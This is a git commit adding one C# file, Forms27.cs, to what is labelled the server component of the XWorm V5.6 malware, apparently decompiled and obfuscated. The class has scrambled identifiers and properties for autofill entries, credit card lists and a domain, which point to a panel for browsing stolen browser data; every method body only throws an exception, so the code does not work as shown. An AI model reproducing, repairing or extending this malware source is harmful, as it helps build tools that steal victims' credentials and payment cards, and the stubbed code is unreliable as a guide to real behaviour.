9e331d2b2e4baa47c1fe1de5f4463bab6a284176
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:50:29 +0400

    Forms27.cs

---
+++ XWorm V5.6/Server/Forms/Forms27.cs
@@ -0,0 +1,53 @@
+﻿using IFIA669D44A37BIIE7E4F11568D7603E;
+using M97E66DDC5D6FEDC246A7B4559E7CC3C;
+using System;
+using System.Collections.Generic;
+using System.Runtime.CompilerServices;
+
+namespace MBFDCM11AE130EMAE0A8M3FE1A778B34
+{
+  public class F62AC51A5A499A8AD3733FFE16D349C8
+  {
+    public static int L43DBFCCC90D39L0F0DFDEAC7D908B64;
+    public static int L8BAC7E8F4LC31ALC474FAF54E0ACAF6;
+    public static int LL92DBF3A1L921E25D836FFABCFBF1E5;
+    public static int L8B83L1866FL8L369C0A33LA348D64AE;
+    public static int L0FD3B24E00EAD93CD4714AA3EAFL26A;
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public List<M9624D6AM60E68CC779BM8C4B6M8FE24> get_listautofill() => throw new Exception("え");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_listautofill(
+      List<M9624D6AM60E68CC779BM8C4B6M8FE24> AutoPropertyValue)
+    {
+      throw new Exception("い");
+    }
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public List<E2D1C0BA3ED2E63FF199E562C1FB1D0D> get_listcredit() => throw new Exception("い");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public void set_listcredit(
+      List<E2D1C0BA3ED2E63FF199E562C1FB1D0D> AutoPropertyValue)
+    {
+      throw new Exception("ヱ");
+    }
+
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public F62AC51A5A499A8AD3733FFE16D349C8() => throw new Exception("ご");
+
+    [CompilerGenerated]
+    [SpecialName]
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public string get_domain() => throw new Exception("ぬ");
+  }
+}
